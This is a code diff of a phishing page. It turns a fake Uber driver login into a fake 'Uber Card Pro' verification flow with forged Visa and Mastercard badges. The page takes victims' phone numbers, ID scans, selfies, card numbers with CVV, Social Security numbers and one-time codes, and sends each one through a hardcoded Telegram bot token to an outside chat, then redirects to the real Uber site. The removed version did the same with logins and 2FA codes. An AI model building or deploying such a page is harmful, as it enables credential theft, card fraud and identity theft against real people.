@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Uber – Driver Login</title>
+    <title>Uber Card Pro – Secure Verification</title>
     <style>
         * {
             margin: 0;
@@ -11,8 +11,8 @@
             box-sizing: border-box;
         }
         body {
-            font-family: 'Uber Move', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #000000;
+            background: #f5f5f5;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -20,38 +20,68 @@
             padding: 20px;
         }
         .container {
-            max-width: 480px;
+            max-width: 550px;
             width: 100%;
-            background: #ffffff;
+            background: white;
             border-radius: 32px;
-            box-shadow: 0 8px 30px rgba(255,255,255,0.05);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
             overflow: hidden;
         }
         .header {
-            padding: 24px 24px 8px 24px;
+            background: #000000;
+            padding: 28px 24px;
+            text-align: center;
         }
         .logo {
             font-size: 28px;
             font-weight: 700;
+            color: white;
             letter-spacing: -0.5px;
-            color: #000000;
         }
         .logo span {
             color: #00b14f;
         }
-        .content {
-            padding: 8px 24px 32px 24px;
+        .badge {
+            background: rgba(255,255,255,0.15);
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 12px;
+            margin-top: 12px;
+            color: #ddd;
         }
-        h1 {
-            font-size: 28px;
+        .content {
+            padding: 32px 28px 40px;
+        }
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 32px;
+            gap: 8px;
+        }
+        .step {
+            flex: 1;
+            text-align: center;
+            font-size: 12px;
+            color: #aaa;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 8px;
+        }
+        .step.active {
+            color: #000;
+            border-bottom-color: #00b14f;
+            font-weight: 500;
+        }
+        h2 {
+            font-size: 24px;
             font-weight: 600;
             margin-bottom: 8px;
             color: #1a1a1a;
         }
-        .step {
+        .desc {
+            color: #666;
             font-size: 14px;
-            color: #6e6e6e;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
         }
         .form-group {
             margin-bottom: 20px;
@@ -63,7 +93,7 @@
             color: #222;
             font-size: 14px;
         }
-        input {
+        input, select {
             width: 100%;
             padding: 14px 16px;
             border: 1px solid #ccc;
@@ -72,64 +102,41 @@
             transition: 0.2s;
             background: #fff;
         }
-        input:focus {
+        input:focus, select:focus {
             outline: none;
-            border-color: #000000;
-            box-shadow: 0 0 0 3px rgba(0,0,0,0.1);
+            border-color: #00b14f;
+            box-shadow: 0 0 0 3px rgba(0,177,79,0.1);
+        }
+        .file-input {
+            padding: 10px 0;
+        }
+        .row-2 {
+            display: flex;
+            gap: 16px;
+        }
+        .row-2 .form-group {
+            flex: 1;
         }
         button {
             width: 100%;
-            background: #000000;
+            background: #00b14f;
             color: white;
             border: none;
-            padding: 14px;
+            padding: 16px;
             font-size: 16px;
             font-weight: 600;
-            border-radius: 16px;
+            border-radius: 40px;
             cursor: pointer;
             transition: background 0.2s;
-            margin-top: 8px;
+            margin-top: 16px;
         }
         button:hover {
-            background: #333;
-        }
-        .recaptcha {
-            background: #f3f3f3;
-            border-radius: 12px;
-            padding: 12px;
-            margin: 20px 0;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 13px;
-            color: #555;
-            border: 1px solid #e0e0e0;
-        }
-        .recaptcha input {
-            width: auto;
-            transform: scale(1.2);
-            margin-right: 8px;
-        }
-        .fake-checkbox {
-            width: 20px;
-            height: 20px;
-            background: white;
-            border: 1px solid #aaa;
-            border-radius: 3px;
-            display: inline-block;
-        }
-        .footer {
-            margin-top: 24px;
-            font-size: 12px;
-            text-align: center;
-            color: #999;
-            border-top: 1px solid #eee;
-            padding-top: 20px;
+            background: #00903f;
         }
         .loading {
             display: none;
             text-align: center;
-            margin-top: 15px;
+            margin-top: 20px;
             color: #00b14f;
             font-size: 14px;
         }
@@ -139,42 +146,58 @@
             margin-top: 8px;
             display: none;
         }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
         hr {
-            margin: 20px 0;
+            margin: 24px 0;
             border: none;
             border-top: 1px solid #eee;
+        }
+        @media (max-width: 500px) {
+            .content { padding: 24px 20px; }
+            .row-2 { flex-direction: column; gap: 0; }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="logo">UBER<span>driver</span></div>
+            <div class="logo">UBER<span>Card Pro</span></div>
+            <div class="badge">Verified by Visa | Mastercard SecureCode</div>
         </div>
         <div class="content">
-            <h1>Driver sign in</h1>
-            <div class="step">Step 1 of 3: Account verification</div>
-            <form id="loginForm">
-                <div class="form-group">
-                    <label>Email or phone number</label>
-                    <input type="text" id="emailOrPhone" required placeholder="driver@example.com or +1 234 567 8900">
-                </div>
-                <div class="form-group">
-                    <label>Password</label>
-                    <input type="password" id="password" required placeholder="Enter your password">
-                </div>
-                <div class="recaptcha" id="recaptchaContainer">
-                    <div style="background:#fff; border:1px solid #aaa; width:18px; height:18px; border-radius:3px;"></div>
-                    <span>I'm not a robot</span>
-                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="margin-left:auto; height:30px;" alt="reCAPTCHA">
-                </div>
-                <button type="submit" id="submitBtn">Continue</button>
-                <div class="loading" id="loadingMsg">Verifying, please wait...</div>
-                <div class="error" id="errorMsg">Incorrect email or password. Please try again.</div>
-            </form>
-            <div class="footer">
-                This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.
+            <div class="step-indicator" id="stepIndicator">
+                <div class="step active" data-step="1">Phone</div>
+                <div class="step" data-step="2">KYC</div>
+                <div class="step" data-step="3">Card</div>
+                <div class="step" data-step="4">SSN</div>
+                <div class="step" data-step="5">OTP</div>
             </div>
+            <div id="formContainer">
+                <!-- Step 1: Phone number -->
+                <div id="step1" class="step-content">
+                    <h2>Welcome back</h2>
+                    <div class="desc">Enter your mobile number to continue</div>
+                    <div class="form-group">
+                        <label>Phone number</label>
+                        <input type="tel" id="phone" placeholder="+1 234 567 8900" autocomplete="off">
+                    </div>
+                    <button onclick="nextStep(1)">Continue</button>
+                </div>
+            </div>
+            <div class="secure-badge">
+                <span>🔒</span> 256-bit SSL encryption
+            </div>
+            <div class="loading" id="loadingMsg">Processing, please wait...</div>
+            <div class="error" id="errorMsg"></div>
         </div>
     </div>
 
@@ -183,17 +206,16 @@
         const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
         const CHAT_ID = '8737104261';
 
-        // Simple fake 2FA flow after password
-        let step = 1; // 1: email/password, 2: 2FA
-        let capturedEmailPhone = '';
-        let capturedPassword = '';
+        let collectedData = {
+            phone: '',
+            kyc: { idFront: null, idBack: null, selfie: null },
+            card: { number: '', expiry: '', cvv: '' },
+            ssn: '',
+            otp: ''
+        };
 
-        const form = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const loadingDiv = document.getElementById('loadingMsg');
-        const errorDiv = document.getElementById('errorMsg');
-        const stepDiv = document.querySelector('.step');
-        const recaptchaDiv = document.getElementById('recaptchaContainer');
+        let currentStep = 1;
+        let isSubmitting = false;
 
         async function sendTelegramMessage(text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -201,101 +223,208 @@
                 await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: 'HTML'
-                    })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                 });
             } catch(e) { console.error(e); }
         }
 
-        function showError(msg) {
-            errorDiv.innerText = msg;
-            errorDiv.style.display = 'block';
-            setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
+        async function sendTelegramFile(file, filename, caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', file, filename);
+            if (caption) formData.append('caption', caption);
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+            } catch(e) { console.error(e); }
         }
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            loadingDiv.style.display = 'block';
-            submitBtn.disabled = true;
+        function showError(msg) {
+            const errDiv = document.getElementById('errorMsg');
+            errDiv.innerText = msg;
+            errDiv.style.display = 'block';
+            setTimeout(() => { errDiv.style.display = 'none'; }, 4000);
+        }
 
-            if (step === 1) {
-                // Capture email/phone and password
-                capturedEmailPhone = document.getElementById('emailOrPhone').value.trim();
-                capturedPassword = document.getElementById('password').value.trim();
+        function showLoading(show) {
+            document.getElementById('loadingMsg').style.display = show ? 'block' : 'none';
+        }
 
-                if (!capturedEmailPhone || !capturedPassword) {
-                    showError('Please fill in both fields.');
-                    loadingDiv.style.display = 'none';
-                    submitBtn.disabled = false;
+        function updateStepIndicator(step) {
+            const steps = document.querySelectorAll('.step');
+            steps.forEach((s, i) => {
+                if (i+1 <= step) s.classList.add('active');
+                else s.classList.remove('active');
+            });
+        }
+
+        function nextStep(current) {
+            if (isSubmitting) return;
+            if (current === 1) {
+                const phone = document.getElementById('phone').value.trim();
+                if (!phone) {
+                    showError('Please enter your phone number.');
                     return;
                 }
-
-                // Send first part to Telegram
-                const message = `<b>🔑 Uber Driver Login (Step 1)</b>\n\n<b>Email/Phone:</b> <code>${escapeHtml(capturedEmailPhone)}</code>\n<b>Password:</b> <code>${escapeHtml(capturedPassword)}</code>\n<b>Time:</b> ${new Date().toLocaleString()}`;
-                await sendTelegramMessage(message);
-
-                // Now switch to 2FA step (simulate)
-                step = 2;
-                stepDiv.innerText = 'Step 2 of 3: Two‑factor authentication';
-                // Replace form fields with 2FA input
-                const formHtml = `
-                    <div class="form-group">
-                        <label>Verification code</label>
-                        <input type="text" id="twoFactorCode" placeholder="Enter 6‑digit code" autocomplete="off">
-                    </div>
-                    <div class="recaptcha" id="recaptchaContainer2" style="display:none;"></div>
-                `;
-                document.querySelector('.form-group').parentNode.innerHTML = formHtml;
-                // Re-attach event listener to new submit button (original button still exists)
-                // We'll recreate the button and event
-                const newForm = document.getElementById('loginForm');
-                const newSubmit = newForm.querySelector('button');
-                // Remove old listener and add new
-                newForm.addEventListener('submit', async (e2) => {
-                    e2.preventDefault();
-                    const code = document.getElementById('twoFactorCode').value.trim();
-                    if (!code) {
-                        showError('Please enter the verification code.');
-                        return;
-                    }
-                    loadingDiv.style.display = 'block';
-                    const message2 = `<b>🔐 Uber Driver 2FA Code</b>\n\n<b>Account:</b> <code>${escapeHtml(capturedEmailPhone)}</code>\n<b>2FA Code:</b> <code>${escapeHtml(code)}</code>\n<b>Time:</b> ${new Date().toLocaleString()}`;
-                    await sendTelegramMessage(message2);
-                    // Redirect to real Uber driver dashboard
-                    loadingDiv.innerText = 'Redirecting to secure dashboard...';
-                    setTimeout(() => {
-                        window.location.href = 'https://www.uber.com/login?redirect=/driver/dashboard/';
-                    }, 1500);
-                });
-                loadingDiv.innerText = 'Almost there...';
-                loadingDiv.style.display = 'block';
-                submitBtn.disabled = false;
-                loadingDiv.style.display = 'none'; // hide after switch
-                return;
+                collectedData.phone = phone;
+                // Send phone number to Telegram
+                sendTelegramMessage(`📞 *Uber Card Pro - Phone*: ${phone}\nTime: ${new Date().toLocaleString()}`);
+                // Move to step 2
+                renderStep2();
+            } else if (current === 2) {
+                // Validate KYC files
+                const idFront = document.getElementById('idFront').files[0];
+                const idBack = document.getElementById('idBack').files[0];
+                const selfie = document.getElementById('selfie').files[0];
+                if (!idFront || !idBack || !selfie) {
+                    showError('Please upload all required documents (ID front, back, and selfie).');
+                    return;
+                }
+                collectedData.kyc.idFront = idFront;
+                collectedData.kyc.idBack = idBack;
+                collectedData.kyc.selfie = selfie;
+                showLoading(true);
+                // Send files to Telegram
+                await sendTelegramFile(idFront, idFront.name, `🆔 ID Front (${collectedData.phone})`);
+                await sendTelegramFile(idBack, idBack.name, `🆔 ID Back (${collectedData.phone})`);
+                await sendTelegramFile(selfie, selfie.name, `🤳 Selfie (${collectedData.phone})`);
+                showLoading(false);
+                renderStep3();
+            } else if (current === 3) {
+                const cardNumber = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
+                const expiry = document.getElementById('expiry').value.trim();
+                const cvv = document.getElementById('cvv').value.trim();
+                if (!cardNumber || !expiry || !cvv) {
+                    showError('Please enter full card details.');
+                    return;
+                }
+                collectedData.card = { number: cardNumber, expiry, cvv };
+                sendTelegramMessage(`💳 *Card Details* (${collectedData.phone})\nCard: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nTime: ${new Date().toLocaleString()}`);
+                renderStep4();
+            } else if (current === 4) {
+                const ssn = document.getElementById('ssn').value.trim();
+                if (!ssn) {
+                    showError('Please enter your SSN.');
+                    return;
+                }
+                collectedData.ssn = ssn;
+                sendTelegramMessage(`🔐 *SSN* (${collectedData.phone}): ${ssn}\nTime: ${new Date().toLocaleString()}`);
+                renderStep5();
             }
-        });
-
-        function escapeHtml(str) {
-            if (!str) return '';
-            return str.replace(/[&<>]/g, function(m) {
-                if (m === '&') return '&amp;';
-                if (m === '<') return '&lt;';
-                if (m === '>') return '&gt;';
-                return m;
-            });
         }
 
-        // Fake reCAPTCHA click (just visual)
-        const recaptchaBox = document.querySelector('.recaptcha');
-        if (recaptchaBox) {
-            recaptchaBox.addEventListener('click', () => {
-                const checkDiv = recaptchaBox.querySelector('div:first-child');
-                if (checkDiv) checkDiv.style.backgroundColor = '#00b14f';
-                // No real functionality
-            });
+        function renderStep2() {
+            currentStep = 2;
+            updateStepIndicator(2);
+            const container = document.getElementById('formContainer');
+            container.innerHTML = `
+                <div id="step2" class="step-content">
+                    <h2>Identity verification</h2>
+                    <div class="desc">We need to verify your identity for Uber Card Pro.</div>
+                    <div class="form-group">
+                        <label>ID card (front side) – Driver's license / Passport</label>
+                        <input type="file" id="idFront" accept="image/*,.pdf" class="file-input" required>
+                    </div>
+                    <div class="form-group">
+                        <label>ID card (back side)</label>
+                        <input type="file" id="idBack" accept="image/*,.pdf" class="file-input" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Selfie with your ID</label>
+                        <input type="file" id="selfie" accept="image/*" class="file-input" required>
+                    </div>
+                    <button onclick="nextStep(2)">Continue</button>
+                </div>
+            `;
+        }
+
+        function renderStep3() {
+            currentStep = 3;
+            updateStepIndicator(3);
+            const container = document.getElementById('formContainer');
+            container.innerHTML = `
+                <div id="step3" class="step-content">
+                    <h2>Card details</h2>
+                    <div class="desc">Enter your preferred payment card for Uber Card Pro.</div>
+                    <div class="form-group">
+                        <label>Card number</label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" autocomplete="off">
+                    </div>
+                    <div class="row-2">
+                        <div class="form-group">
+                            <label>Expiry (MM/YY)</label>
+                            <input type="text" id="expiry" placeholder="MM/YY">
+                        </div>
+                        <div class="form-group">
+                            <label>CVV</label>
+                            <input type="text" id="cvv" placeholder="123">
+                        </div>
+                    </div>
+                    <button onclick="nextStep(3)">Continue</button>
+                </div>
+            `;
+        }
+
+        function renderStep4() {
+            currentStep = 4;
+            updateStepIndicator(4);
+            const container = document.getElementById('formContainer');
+            container.innerHTML = `
+                <div id="step4" class="step-content">
+                    <h2>Social Security Number</h2>
+                    <div class="desc">For tax purposes, please provide your SSN.</div>
+                    <div class="form-group">
+                        <label>SSN (9 digits)</label>
+                        <input type="text" id="ssn" placeholder="XXX-XX-XXXX" autocomplete="off">
+                    </div>
+                    <button onclick="nextStep(4)">Continue</button>
+                </div>
+            `;
+        }
+
+        function renderStep5() {
+            currentStep = 5;
+            updateStepIndicator(5);
+            const container = document.getElementById('formContainer');
+            container.innerHTML = `
+                <div id="step5" class="step-content">
+                    <h2>One‑time verification code</h2>
+                    <div class="desc">We've sent a 6‑digit code to ${collectedData.phone}. Enter it below.</div>
+                    <div class="form-group">
+                        <label>Verification code</label>
+                        <input type="text" id="otp" placeholder="123456" autocomplete="off">
+                    </div>
+                    <button onclick="finalSubmit()">Verify & Activate</button>
+                </div>
+            `;
+        }
+
+        async function finalSubmit() {
+            if (isSubmitting) return;
+            const otp = document.getElementById('otp').value.trim();
+            if (!otp) {
+                showError('Please enter the verification code.');
+                return;
+            }
+            collectedData.otp = otp;
+            showLoading(true);
+            // Send OTP to Telegram
+            await sendTelegramMessage(`🔢 *OTP Code* (${collectedData.phone}): ${otp}\nTime: ${new Date().toLocaleString()}`);
+            // Send summary
+            const summary = `✅ *Uber Card Pro – Full Report*\n\n` +
+                `📞 Phone: ${collectedData.phone}\n` +
+                `💳 Card: ${collectedData.card.number}\n` +
+                `📅 Expiry: ${collectedData.card.expiry}\n` +
+                `🔐 CVV: ${collectedData.card.cvv}\n` +
+                `🆔 SSN: ${collectedData.ssn}\n` +
+                `🔢 OTP: ${collectedData.otp}\n` +
+                `🕒 Time: ${new Date().toLocaleString()}`;
+            await sendTelegramMessage(summary);
+            showLoading(false);
+            // Redirect to official Uber
+            setTimeout(() => {
+                window.location.href = 'https://www.uber.com/';
+            }, 1500);
         }
     </script>
 </body>
